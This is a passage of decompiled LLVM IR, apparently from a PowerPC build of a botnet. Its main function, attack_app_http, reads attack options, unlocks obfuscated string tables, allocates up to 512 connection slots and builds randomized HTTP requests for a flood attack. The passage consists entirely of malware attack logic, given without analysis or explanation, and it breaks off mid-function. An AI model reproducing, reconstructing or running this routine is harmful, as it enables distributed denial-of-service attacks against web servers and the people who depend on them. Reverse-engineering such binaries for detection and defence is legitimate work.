  store i8 %v1_100009dc, i8* @global_var_100211d8.12, align 1
  %v0_100009e0 = load i32, i32* %r10.global-to-local, align 4
  store i32 %v0_100009e0, i32* @global_var_100211dc.13, align 4
  store i32 268437992, i32* @lr, align 4
  %v2_100009e4 = call i32 @calloc(i32 1, i32 8)
  store i32 %v2_100009e4, i32* @r28, align 4
  store i32 9, i32* %r0.global-to-local, align 4
  %v3_100009fc = load i32, i32* @global_var_100211dc.13, align 4
  %v2_10000a00 = inttoptr i32 %v2_100009e4 to i32*
  store i32 268438092, i32* %v2_10000a00, align 4
  store i32 ptrtoint (i8* @global_var_100211d9.15 to i32), i32* %r4.global-to-local, align 4
  %v0_10000a08 = load i32, i32* %r0.global-to-local, align 4
  %v1_10000a08 = trunc i32 %v0_10000a08 to i8
  %v2_10000a08 = load i32, i32* @r28, align 4
  %v3_10000a08 = add i32 %v2_10000a08, 4
  %v4_10000a08 = inttoptr i32 %v3_10000a08 to i8*
  store i8 %v1_10000a08, i8* %v4_10000a08, align 1
  %v0_10000a0c = load i32, i32* %r4.global-to-local, align 4
  %v1_10000a0c = mul i32 %v0_10000a0c, 4
  store i32 %v1_10000a0c, i32* %r4.global-to-local, align 4
  store i32 268438036, i32* @lr, align 4
  %v2_10000a10 = inttoptr i32 %v3_100009fc to i32*
  %v3_10000a10 = call i32 @realloc(i32* %v2_10000a10, i32 %v1_10000a0c)
  %v3_10000a14 = load i8, i8* @global_var_100211d8.12, align 1
  %v4_10000a14 = zext i8 %v3_10000a14 to i32
  store i32 %v3_10000a10, i32* @global_var_100211dc.13, align 4
  store i32 ptrtoint (i8* @global_var_100211d9.15 to i32), i32* %r0.global-to-local, align 4
  %v1_10000a20 = mul nuw nsw i32 %v4_10000a14, 4
  %v0_10000a24 = load i32, i32* @r28, align 4
  %v3_10000a24 = add i32 %v1_10000a20, %v3_10000a10
  %v4_10000a24 = inttoptr i32 %v3_10000a24 to i32*
  store i32 %v0_10000a24, i32* %v4_10000a24, align 4
  %v0_10000a2c = load i32, i32* %r0.global-to-local, align 4
  %v1_10000a2c = trunc i32 %v0_10000a2c to i8
  store i8 %v1_10000a2c, i8* @global_var_100211d8.12, align 1
  store i32 %v0_100006cc, i32* %r0.global-to-local, align 4
  store i32 %v0_100006e8, i32* @r28, align 4
  ret i32 1

; uselistorder directives
  uselistorder i32 %v1_10000a0c, { 1, 0 }
  uselistorder i32 %v1_100009b8, { 1, 0 }
  uselistorder i32 %v1_10000964, { 1, 0 }
  uselistorder i32 %v1_10000910, { 1, 0 }
  uselistorder i32 %v1_100008bc, { 1, 0 }
  uselistorder i32 %v1_10000868, { 1, 0 }
  uselistorder i32 %v1_10000814, { 1, 0 }
  uselistorder i32 %v1_100007c0, { 1, 0 }
  uselistorder i32 %v1_1000076c, { 1, 0 }
  uselistorder i32 %v1_10000718, { 1, 0 }
  uselistorder i8* @global_var_100211d8.12, { 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_100211d9.15 to i32), { 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
}

define i32 @attack_app_http(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cr3_eq.global-to-local = alloca i1, align 1
  %cr4_eq.global-to-local = alloca i1, align 1
  %cr4_lt.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %cr7_lt.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r14.global-to-local = alloca i32, align 4
  %r16.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r19.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r22.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-20880 = alloca i32, align 4
  %stack_var_-20884 = alloca i32, align 4
  %stack_var_-20876 = alloca i32, align 4
  %stack_var_-20868 = alloca i32, align 4
  %stack_var_-20596 = alloca i32, align 4
  %stack_var_-20888 = alloca i32, align 4
  %stack_var_-20724 = alloca i32, align 4
  %stack_var_-20852 = alloca i32, align 4
  %stack_var_-10356 = alloca i32, align 4
  %v0_10000a50 = load i32, i32* @lr, align 4
  store i32 %v0_10000a50, i32* %r0.global-to-local, align 4
  %v0_10000a54 = call i32 @__asm_mfcr()
  store i32 %arg3, i32* %r29.global-to-local, align 4
  %v0_10000a60 = load i32, i32* @r21, align 4
  %v0_10000a68 = load i32, i32* @r22, align 4
  store i32 %arg2, i32* @r21, align 4
  %v0_10000a70 = load i32, i32* @r28, align 4
  store i32 %arg4, i32* %r4.global-to-local, align 4
  store i32 %arg4, i32* %r28.global-to-local, align 4
  store i32 %v0_10000a54, i32* @r22, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  %v0_10000a88 = load i32, i32* %r0.global-to-local, align 4
  %v2_10000a9c = ptrtoint i32* %stack_var_-10356 to i32
  store i32 %v2_10000a9c, i32* %r20.global-to-local, align 4
  %v0_10000aa0 = load i32, i32* @r25, align 4
  %v0_10000aa4 = load i32, i32* @r26, align 4
  %v0_10000aa8 = load i32, i32* @r27, align 4
  %v0_10000aac = load i32, i32* @r31, align 4
  %v0_10000ac8 = load i32, i32* @r30, align 4
  store i32 268438224, i32* @lr, align 4
  %v4_10000acc = inttoptr i32 %arg4 to i32*
  %v5_10000acc = call i32 @attack_get_opt_str(i32 %arg3, i32* %v4_10000acc, i32 20, i32 0)
  store i32 268500992, i32* %r9.global-to-local, align 4
  %v0_10000adc = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10000adc, i32* %r4.global-to-local, align 4
  store i32 %v5_10000acc, i32* %r14.global-to-local, align 4
  %v0_10000ae4 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10000ae4, i32* %r3.global-to-local, align 4
  store i32 268438252, i32* @lr, align 4
  %v5_10000ae8 = inttoptr i32 %v0_10000adc to i32*
  %v6_10000ae8 = call i32 @attack_get_opt_str(i32 %v0_10000ae4, i32* %v5_10000ae8, i32 19, i32 ptrtoint ([4 x i8]* @global_var_100100cc.16 to i32))
  %v0_10000aec = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10000aec, i32* %r4.global-to-local, align 4
  store i32 %v6_10000ae8, i32* @r25, align 4
  %v0_10000afc = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10000afc, i32* %r3.global-to-local, align 4
  store i32 268438276, i32* @lr, align 4
  %v4_10000b00 = inttoptr i32 %v0_10000aec to i32*
  %v5_10000b00 = call i32 @attack_get_opt_str(i32 %v0_10000afc, i32* %v4_10000b00, i32 8, i32 0)
  store i32 %v5_10000b00, i32* @r26, align 4
  %v0_10000b14 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10000b14, i32* %r4.global-to-local, align 4
  %v0_10000b18 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10000b18, i32* %r3.global-to-local, align 4
  store i32 268438304, i32* @lr, align 4
  %v4_10000b1c = inttoptr i32 %v0_10000b14 to i32*
  %v5_10000b1c = call i32 @attack_get_opt_str(i32 %v0_10000b18, i32* %v4_10000b1c, i32 21, i32 ptrtoint (i32* @global_var_100100d0.27 to i32))
  %v0_10000b20 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10000b20, i32* %r4.global-to-local, align 4
  store i32 %v5_10000b1c, i32* @r27, align 4
  %v0_10000b30 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10000b30, i32* %r3.global-to-local, align 4
  store i32 268438328, i32* @lr, align 4
  %v4_10000b34 = inttoptr i32 %v0_10000b20 to i32*
  %v5_10000b34 = call i32 @attack_get_opt_int(i32 %v0_10000b30, i32* %v4_10000b34, i32 23, i32 1)
  %v0_10000b38 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10000b38, i32* %r4.global-to-local, align 4
  store i32 %v5_10000b34, i32* %r31.global-to-local, align 4
  %v0_10000b48 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10000b48, i32* %r3.global-to-local, align 4
  store i32 268438352, i32* @lr, align 4
  %v4_10000b4c = inttoptr i32 %v0_10000b38 to i32*
  %v5_10000b4c = call i32 @attack_get_opt_int(i32 %v0_10000b48, i32* %v4_10000b4c, i32 7, i32 80)
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 %v2_10000a9c, i32* %r3.global-to-local, align 4
  store i32 268438372, i32* @lr, align 4
  %v3_10000b60 = call i32 @__GI_memset(i32 %v2_10000a9c, i32 0, i32 10241)
  store i32 %v3_10000b60, i32* %r3.global-to-local, align 4
  %v0_10000b64 = load i32, i32* @r26, align 4
  %v1_10000b64 = icmp slt i32 %v0_10000b64, 0
  %v3_10000b64 = icmp eq i32 %v0_10000b64, 0
  store i1 %v1_10000b64, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10000b64, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10000b64, label %dec_label_pc_10000b84, label %dec_label_pc_10000b6c

dec_label_pc_10000b6c:                            ; preds = %entry
  %v0_10000b6c = load i32, i32* @r27, align 4
  %v1_10000b6c = icmp slt i32 %v0_10000b6c, 0
  %v3_10000b6c = icmp eq i32 %v0_10000b6c, 0
  store i1 %v1_10000b6c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10000b6c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10000b6c, label %dec_label_pc_10000b84, label %dec_label_pc_10000b74

dec_label_pc_10000b74:                            ; preds = %dec_label_pc_10000b6c
  store i32 %v0_10000b6c, i32* %r3.global-to-local, align 4
  store i32 268438396, i32* @lr, align 4
  %v1_10000b78 = inttoptr i32 %v0_10000b6c to i8*
  %v2_10000b78 = call i32 @util_strlen(i8* %v1_10000b78)
  store i32 %v2_10000b78, i32* %r3.global-to-local, align 4
  %v1_10000b7c = icmp slt i32 %v2_10000b78, 255
  %v3_10000b7c = icmp eq i32 %v2_10000b78, 255
  store i1 %v1_10000b7c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10000b7c, i1* %cr7_eq.global-to-local, align 1
  %tmp111 = icmp slt i32 %v2_10000b78, 256
  br i1 %tmp111, label %dec_label_pc_10000be4, label %dec_label_pc_10000b84

dec_label_pc_10000b84:                            ; preds = %dec_label_pc_10000bf4, %dec_label_pc_10000be4, %dec_label_pc_10000b74, %dec_label_pc_10000b6c, %entry
  store i32 %v0_10000a88, i32* %r0.global-to-local, align 4
  %v1_10000b98 = call %0 @__asm_mtcrf(i32 24, i32 %v0_10000a54)
  store i32 %v0_10000a60, i32* %r21.global-to-local, align 4
  store i32 %v0_10000a68, i32* %r22.global-to-local, align 4
  store i32 %v0_10000aa0, i32* %r25.global-to-local, align 4
  store i32 %v0_10000aa4, i32* %r26.global-to-local, align 4
  store i32 %v0_10000aa8, i32* %r27.global-to-local, align 4
  store i32 %v0_10000a70, i32* %r28.global-to-local, align 4
  store i32 %v0_10000ac8, i32* %r30.global-to-local, align 4
  store i32 %v0_10000aac, i32* %r31.global-to-local, align 4
  %v0_10000be0 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10000be0

dec_label_pc_10000be4:                            ; preds = %dec_label_pc_10000b74
  %v0_10000be4 = load i32, i32* @r26, align 4
  store i32 %v0_10000be4, i32* %r3.global-to-local, align 4
  store i32 268438508, i32* @lr, align 4
  %v1_10000be8 = inttoptr i32 %v0_10000be4 to i8*
  %v2_10000be8 = call i32 @util_strlen(i8* %v1_10000be8)
  store i32 %v2_10000be8, i32* %r3.global-to-local, align 4
  %v1_10000bec = icmp slt i32 %v2_10000be8, 127
  %v2_10000bec = icmp sgt i32 %v2_10000be8, 127
  %v3_10000bec = icmp eq i32 %v2_10000be8, 127
  store i1 %v1_10000bec, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10000bec, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10000bec, label %dec_label_pc_10000b84, label %dec_label_pc_10000bf4

dec_label_pc_10000bf4:                            ; preds = %dec_label_pc_10000be4
  %v0_10000bf4 = load i32, i32* @r25, align 4
  store i32 %v0_10000bf4, i32* %r3.global-to-local, align 4
  store i32 268438524, i32* @lr, align 4
  %v1_10000bf8 = inttoptr i32 %v0_10000bf4 to i8*
  %v2_10000bf8 = call i32 @util_strlen(i8* %v1_10000bf8)
  store i32 %v2_10000bf8, i32* %r3.global-to-local, align 4
  %v1_10000bfc = icmp slt i32 %v2_10000bf8, 9
  %v2_10000bfc = icmp sgt i32 %v2_10000bf8, 9
  %v3_10000bfc = icmp eq i32 %v2_10000bf8, 9
  store i1 %v1_10000bfc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10000bfc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10000bfc, label %dec_label_pc_10000b84, label %dec_label_pc_10000c0c

dec_label_pc_10000c0c:                            ; preds = %dec_label_pc_10000bf4, %dec_label_pc_10000c40
  %storemerge5 = phi i32 [ %v1_10000c40, %dec_label_pc_10000c40 ], [ 0, %dec_label_pc_10000bf4 ]
  store i32 %storemerge5, i32* %r4.global-to-local, align 4
  store i32 %storemerge5, i32* %stack_var_-20888, align 4
  %v0_10000c0c = load i32, i32* @r25, align 4
  store i32 %v0_10000c0c, i32* %r3.global-to-local, align 4
  store i32 268438548, i32* @lr, align 4
  %v1_10000c10 = inttoptr i32 %v0_10000c0c to i8*
  %v2_10000c10 = call i32 @util_strlen(i8* %v1_10000c10)
  store i32 %v2_10000c10, i32* %r3.global-to-local, align 4
  %v3_10000c14 = load i32, i32* %stack_var_-20888, align 4
  store i32 %v3_10000c14, i32* %r4.global-to-local, align 4
  %v2_10000c18 = icmp slt i32 %v2_10000c10, %v3_10000c14
  %v3_10000c18 = icmp sgt i32 %v2_10000c10, %v3_10000c14
  %v4_10000c18 = icmp eq i32 %v2_10000c10, %v3_10000c14
  store i1 %v2_10000c18, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10000c18, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10000c18, label %dec_label_pc_10000c20, label %dec_label_pc_10000c4c

dec_label_pc_10000c20:                            ; preds = %dec_label_pc_10000c0c
  %v0_10000c20 = load i32, i32* @r25, align 4
  %v2_10000c20 = add i32 %v0_10000c20, %v3_10000c14
  %v3_10000c20 = inttoptr i32 %v2_10000c20 to i8*
  %v4_10000c20 = load i8, i8* %v3_10000c20, align 1
  %v5_10000c20 = zext i8 %v4_10000c20 to i32
  store i32 %v5_10000c20, i32* %r9.global-to-local, align 4
  %v1_10000c24 = add nuw nsw i32 %v5_10000c20, 159
  %v1_10000c28 = urem i32 %v1_10000c24, 256
  store i32 %v1_10000c28, i32* %r0.global-to-local, align 4
  %v1_10000c2c = icmp ult i32 %v1_10000c28, 25
  %v2_10000c2c = icmp ugt i32 %v1_10000c28, 25
  %v3_10000c2c = icmp eq i32 %v1_10000c28, 25
  store i1 %v1_10000c2c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10000c2c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10000c2c, label %dec_label_pc_10000c40, label %dec_label_pc_10000c34

dec_label_pc_10000c34:                            ; preds = %dec_label_pc_10000c20
  %v1_10000c34 = add nsw i32 %v5_10000c20, -32
  store i32 %v1_10000c34, i32* %r0.global-to-local, align 4
  %v3_10000c38 = trunc i32 %v1_10000c34 to i8
  store i8 %v3_10000c38, i8* %v3_10000c20, align 1
  %v3_10000c3c = load i32, i32* %stack_var_-20888, align 4
  store i32 %v3_10000c3c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10000c40

dec_label_pc_10000c40:                            ; preds = %dec_label_pc_10000c20, %dec_label_pc_10000c34
  %v0_10000c40 = phi i32 [ %v3_10000c14, %dec_label_pc_10000c20 ], [ %v3_10000c3c, %dec_label_pc_10000c34 ]
  %v1_10000c40 = add i32 %v0_10000c40, 1
  br label %dec_label_pc_10000c0c

dec_label_pc_10000c4c:                            ; preds = %dec_label_pc_10000c0c
  %v0_10000c4c = load i32, i32* %r31.global-to-local, align 4
  %v1_10000c4c = icmp slt i32 %v0_10000c4c, 512
  %v2_10000c4c = icmp sgt i32 %v0_10000c4c, 512
  %v3_10000c4c = icmp eq i32 %v0_10000c4c, 512
  store i1 %v1_10000c4c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10000c4c, i1* %cr7_eq.global-to-local, align 1
  %v0_10000c50. = select i1 %v2_10000c4c, i32 512, i32 %v0_10000c4c
  store i32 %v0_10000c50., i32* @r24, align 4
  store i32 43, i32* %r3.global-to-local, align 4
  %v1_10000c60 = icmp slt i32 %v0_10000c50., 0
  %v3_10000c60 = icmp eq i32 %v0_10000c50., 0
  store i1 %v1_10000c60, i1* %cr4_lt.global-to-local, align 1
  store i1 %v3_10000c60, i1* %cr4_eq.global-to-local, align 1
  store i32 ptrtoint ([3 x i8]* @global_var_10000c68.28 to i32), i32* @lr, align 4
  %v1_10000c64 = call i32 @table_unlock_val(i32 43)
  store i32 44, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10000c70.29 to i32), i32* @lr, align 4
  %v1_10000c6c = call i32 @table_unlock_val(i32 44)
  store i32 45, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10000c78.30 to i32), i32* @lr, align 4
  %v1_10000c74 = call i32 @table_unlock_val(i32 45)
  store i32 46, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10000c80.31 to i32), i32* @lr, align 4
  %v1_10000c7c = call i32 @table_unlock_val(i32 46)
  store i32 47, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10000c88.32 to i32), i32* @lr, align 4
  %v1_10000c84 = call i32 @table_unlock_val(i32 47)
  store i32 48, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10000c90.33 to i32), i32* @lr, align 4
  %v1_10000c8c = call i32 @table_unlock_val(i32 48)
  store i32 49, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10000c98.34 to i32), i32* @lr, align 4
  %v1_10000c94 = call i32 @table_unlock_val(i32 49)
  store i32 50, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10000ca0.35 to i32), i32* @lr, align 4
  %v1_10000c9c = call i32 @table_unlock_val(i32 50)
  store i32 51, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10000ca8.36 to i32), i32* @lr, align 4
  %v1_10000ca4 = call i32 @table_unlock_val(i32 51)
  store i32 52, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10000cb0.37 to i32), i32* @lr, align 4
  %v1_10000cac = call i32 @table_unlock_val(i32 52)
  store i32 53, i32* %r3.global-to-local, align 4
  store i32 268438712, i32* @lr, align 4
  %v1_10000cb4 = call i32 @table_unlock_val(i32 53)
  %v0_10000cb8 = load i32, i32* @r24, align 4
  store i32 %v0_10000cb8, i32* %r3.global-to-local, align 4
  store i32 3140, i32* %r4.global-to-local, align 4
  store i32 268438724, i32* @lr, align 4
  %v2_10000cc0 = call i32 @calloc(i32 %v0_10000cb8, i32 3140)
  store i32 %v2_10000cc0, i32* %r3.global-to-local, align 4
  %v0_10000cc8 = load i1, i1* %cr4_eq.global-to-local, align 1
  %v1_10000cc8 = load i1, i1* %cr4_lt.global-to-local, align 1
  %v2_10000cc8 = or i1 %v0_10000cc8, %v1_10000cc8
  br i1 %v2_10000cc8, label %dec_label_pc_10000dcc, label %dec_label_pc_10000ccc

dec_label_pc_10000ccc:                            ; preds = %dec_label_pc_10000c4c
  store i32 268500992, i32* %r9.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1001003c.38 to i32), i32* %r19.global-to-local, align 4
  store i32 -858993459, i32* %r18.global-to-local, align 4
  store i32 %v2_10000cc0, i32* %r31.global-to-local, align 4
  store i32 0, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_10000ce4

dec_label_pc_10000ce4:                            ; preds = %dec_label_pc_10002460.dec_label_pc_10000ce4_crit_edge, %dec_label_pc_10000ccc
  %v2_10000cf0 = phi i32 [ %v2_10000cf0.pre, %dec_label_pc_10002460.dec_label_pc_10000ce4_crit_edge ], [ %v2_10000cc0, %dec_label_pc_10000ccc ]
  %v0_10000ce4 = phi i32 [ %v0_10002474, %dec_label_pc_10002460.dec_label_pc_10000ce4_crit_edge ], [ 0, %dec_label_pc_10000ccc ]
  %v1_10000ce4 = load i32, i32* @r22, align 4
  %v2_10000ce4 = sdiv i32 %v0_10000ce4, %v1_10000ce4
  store i32 %v2_10000ce4, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  store i32 -1, i32* %r11.global-to-local, align 4
  %v3_10000cf0 = add i32 %v2_10000cf0, 4
  %v4_10000cf0 = inttoptr i32 %v3_10000cf0 to i8*
  store i8 0, i8* %v4_10000cf0, align 1
  %v0_10000cf4 = load i32, i32* %r11.global-to-local, align 4
  %v1_10000cf4 = load i32, i32* %r31.global-to-local, align 4
  %v2_10000cf4 = inttoptr i32 %v1_10000cf4 to i32*
  store i32 %v0_10000cf4, i32* %v2_10000cf4, align 4
  %v0_10000cf8 = load i32, i32* %r31.global-to-local, align 4
  %v1_10000cf8 = add i32 %v0_10000cf8, 532
  store i32 %v1_10000cf8, i32* %r23.global-to-local, align 4
  store i32 %v1_10000cf8, i32* @r3, align 4
  %v0_10000d00 = load i32, i32* @r27, align 4
  store i32 %v0_10000d00, i32* %r4.global-to-local, align 4
  %v0_10000d04 = load i32, i32* %r0.global-to-local, align 4
  %v1_10000d04 = load i32, i32* @r22, align 4
  %v2_10000d04 = mul i32 %v1_10000d04, %v0_10000d04
  %v1_10000d08 = load i32, i32* %r28.global-to-local, align 4
  %v2_10000d08 = sub i32 %v1_10000d08, %v2_10000d04
  %v1_10000d0c = mul i32 %v2_10000d08, 24
  store i32 %v1_10000d0c, i32* %r0.global-to-local, align 4
  %v1_10000d10 = load i32, i32* @r21, align 4
  %v2_10000d10 = add i32 %v1_10000d10, %v1_10000d0c
  store i32 %v2_10000d10, i32* %r30.global-to-local, align 4
  %v1_10000d14 = add i32 %v2_10000d10, 16
  %v2_10000d14 = inttoptr i32 %v1_10000d14 to i32*
  %v3_10000d14 = load i32, i32* %v2_10000d14, align 4
  store i32 %v3_10000d14, i32* %r9.global-to-local, align 4
  %v2_10000d18 = add i32 %v0_10000cf8, 16
  %v3_10000d18 = inttoptr i32 %v2_10000d18 to i32*
  store i32 %v3_10000d14, i32* %v3_10000d18, align 4
  %v2_10000d1c = inttoptr i32 %v1_10000cf8 to i8*
  %v3_10000d1c = call i32 @util_strcpy(i8* %v2_10000d1c, i32 %v0_10000d00)
  store i32 %v3_10000d1c, i32* %r3.global-to-local, align 4
  %v0_10000d20 = load i32, i32* %r31.global-to-local, align 4
  %v1_10000d20 = add i32 %v0_10000d20, 532
  %v2_10000d20 = inttoptr i32 %v1_10000d20 to i8*
  %v3_10000d20 = load i8, i8* %v2_10000d20, align 1
  %v4_10000d20 = zext i8 %v3_10000d20 to i32
  store i32 %v4_10000d20, i32* %r0.global-to-local, align 4
  %v1_10000d24 = icmp ult i8 %v3_10000d20, 47
  %v3_10000d24 = icmp eq i8 %v3_10000d20, 47
  store i1 %v1_10000d24, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10000d24, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10000d24, label %dec_label_pc_10000d4c, label %dec_label_pc_10000d2c

dec_label_pc_10000d2c:                            ; preds = %dec_label_pc_10000ce4
  %v0_10000d2c = load i32, i32* %r23.global-to-local, align 4
  store i32 %v0_10000d2c, i32* %r3.global-to-local, align 4
  store i32 268438836, i32* @lr, align 4
  %v1_10000d30 = inttoptr i32 %v0_10000d2c to i8*
  %v2_10000d30 = call i32 @util_strlen(i8* %v1_10000d30)
  %v0_10000d34 = load i32, i32* %r23.global-to-local, align 4
  store i32 %v0_10000d34, i32* %r4.global-to-local, align 4
  %v0_10000d3c = load i32, i32* %r31.global-to-local, align 4
  %v1_10000d3c = add i32 %v0_10000d3c, 533
  store i32 %v1_10000d3c, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10000d44.39 to i32), i32* @lr, align 4
  %v3_10000d40 = call i32 @memmove(i32 %v1_10000d3c, i32 %v0_10000d34, i32 %v2_10000d30)
  store i32 %v3_10000d40, i32* %r3.global-to-local, align 4
  store i32 47, i32* %r0.global-to-local, align 4
  %v2_10000d48 = load i32, i32* %r31.global-to-local, align 4
  %v3_10000d48 = add i32 %v2_10000d48, 532
  %v4_10000d48 = inttoptr i32 %v3_10000d48 to i8*
  store i8 47, i8* %v4_10000d48, align 1
  %v0_10000d50.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10000d4c

dec_label_pc_10000d4c:                            ; preds = %dec_label_pc_10000ce4, %dec_label_pc_10000d2c
  %v0_10000d50 = phi i32 [ %v0_10000d20, %dec_label_pc_10000ce4 ], [ %v0_10000d50.pre, %dec_label_pc_10000d2c ]
  %v0_10000d4c = load i32, i32* @r25, align 4
  store i32 %v0_10000d4c, i32* %r4.global-to-local, align 4
  %v1_10000d50 = add i32 %v0_10000d50, 1440
  store i32 %v1_10000d50, i32* @r3, align 4
  %v2_10000d54 = inttoptr i32 %v1_10000d50 to i8*
  %v3_10000d54 = call i32 @util_strcpy(i8* %v2_10000d54, i32 %v0_10000d4c)
  %v0_10000d58 = load i32, i32* @r25, align 4
  store i32 %v0_10000d58, i32* %r4.global-to-local, align 4
  %v0_10000d5c = load i32, i32* %r31.global-to-local, align 4
  %v1_10000d5c = add i32 %v0_10000d5c, 1431
  store i32 %v1_10000d5c, i32* @r3, align 4
  %v2_10000d60 = inttoptr i32 %v1_10000d5c to i8*
  %v3_10000d60 = call i32 @util_strcpy(i8* %v2_10000d60, i32 %v0_10000d58)
  %v0_10000d64 = load i32, i32* %r31.global-to-local, align 4
  %v1_10000d64 = add i32 %v0_10000d64, 789
  store i32 %v1_10000d64, i32* @r3, align 4
  %v0_10000d68 = load i32, i32* @r26, align 4
  store i32 %v0_10000d68, i32* %r4.global-to-local, align 4
  %v2_10000d6c = inttoptr i32 %v1_10000d64 to i8*
  %v3_10000d6c = call i32 @util_strcpy(i8* %v2_10000d6c, i32 %v0_10000d68)
  store i32 %v3_10000d6c, i32* %r3.global-to-local, align 4
  %v0_10000d70 = load i32, i32* %r30.global-to-local, align 4
  %v1_10000d70 = add i32 %v0_10000d70, 20
  %v2_10000d70 = inttoptr i32 %v1_10000d70 to i8*
  %v3_10000d70 = load i8, i8* %v2_10000d70, align 1
  %v4_10000d70 = zext i8 %v3_10000d70 to i32
  store i32 %v4_10000d70, i32* %r0.global-to-local, align 4
  %v1_10000d74 = icmp ult i8 %v3_10000d70, 31
  %v2_10000d74 = icmp ugt i8 %v3_10000d70, 31
  %v3_10000d74 = icmp eq i8 %v3_10000d70, 31
  store i1 %v1_10000d74, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10000d74, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10000d74, label %dec_label_pc_10000d94, label %dec_label_pc_10000d7c

dec_label_pc_10000d7c:                            ; preds = %dec_label_pc_10000d4c
  %v1_10000d7c = add i32 %v0_10000d70, 16
  %v2_10000d7c = inttoptr i32 %v1_10000d7c to i32*
  %v3_10000d7c = load i32, i32* %v2_10000d7c, align 4
  store i32 %v3_10000d7c, i32* %r29.global-to-local, align 4
  %v0_10000d80 = call i32 @rand_next()
  store i32 %v0_10000d80, i32* %r3.global-to-local, align 4
  %v0_10000d84 = load i32, i32* %r30.global-to-local, align 4
  %v1_10000d84 = add i32 %v0_10000d84, 20
  %v2_10000d84 = inttoptr i32 %v1_10000d84 to i8*
  %v3_10000d84 = load i8, i8* %v2_10000d84, align 1
  %v4_10000d84 = zext i8 %v3_10000d84 to i32
  store i32 %v4_10000d84, i32* %r0.global-to-local, align 4
  %tmp = urem i8 %v3_10000d84, 64
  %v2_10000d88 = zext i8 %tmp to i32
  %v3_10000d88 = lshr i32 %v0_10000d80, %v2_10000d88
  %v1_10000d8c = load i32, i32* %r29.global-to-local, align 4
  %v2_10000d8c = add i32 %v3_10000d88, %v1_10000d8c
  store i32 %v2_10000d8c, i32* %r3.global-to-local, align 4
  %v1_10000d90 = load i32, i32* %r31.global-to-local, align 4
  %v2_10000d90 = add i32 %v1_10000d90, 16
  %v3_10000d90 = inttoptr i32 %v2_10000d90 to i32*
  store i32 %v2_10000d8c, i32* %v3_10000d90, align 4
  br label %dec_label_pc_10000d94

dec_label_pc_10000d94:                            ; preds = %dec_label_pc_10000d4c, %dec_label_pc_10000d7c
  %v0_10000d94 = call i32 @rand_next()
  %v1_10000d94 = sext i32 %v0_10000d94 to i64
